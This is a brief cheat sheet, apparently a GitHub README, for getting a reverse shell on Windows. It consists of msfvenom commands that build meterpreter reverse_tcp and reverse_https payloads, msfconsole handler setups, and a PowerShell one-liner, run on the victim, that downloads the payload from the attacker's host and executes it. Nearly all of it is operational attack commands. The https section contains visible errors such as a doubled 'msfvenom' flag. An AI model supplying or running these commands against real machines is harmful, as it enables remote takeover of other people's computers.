# WINREV

Reverse Shell for Windows

Creator: Dhayalan

## On attacker

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe > <FILENAME>`

`msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <ATTACKER_IP>; set LPORT <ATTACKER_PORT>; exploit'`


## On victim

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER_IP>/<FILENAME>', 'C:\Windows\Temp\<FILENAME>'); Start-Process 'C:\Windows\Temp\<FILENAME>'"`

## For https

### MsfVenom
```bash
msfvenom -msfvenom -p windows/meterpreter/reverse_https LHOST=<tu dirección IP> LPORT=<puerto> -f exe -o payload.exe
```

### MsfConsole
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <tu dirección IP>
set LPORT <puerto>
set EnableStageEncoding true
set EnableUnicodeEncoding true
generate -t <ruta del certificado PEM>
```
